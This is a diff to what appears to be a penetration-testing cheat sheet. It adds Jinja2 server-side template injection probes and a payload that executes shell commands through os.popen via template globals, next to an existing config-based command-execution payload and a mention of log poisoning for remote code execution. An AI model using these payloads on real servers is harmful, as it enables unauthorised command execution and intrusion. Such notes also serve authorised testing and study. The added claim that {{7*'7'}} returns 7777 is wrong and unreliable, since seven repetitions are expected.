@@ -512,9 +512,12 @@ If we can read log files,we can poison them to get RCE<br />
 ### SSTI (Server Side Template Injection)
 
 #### Jinja2
+To check if it's jinja test`{{7*'7'}}` this would return 7777
 
 Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a result it is vulnerable to SSTI <br/>
 
+
+`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
 
 **Exploit**
 `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
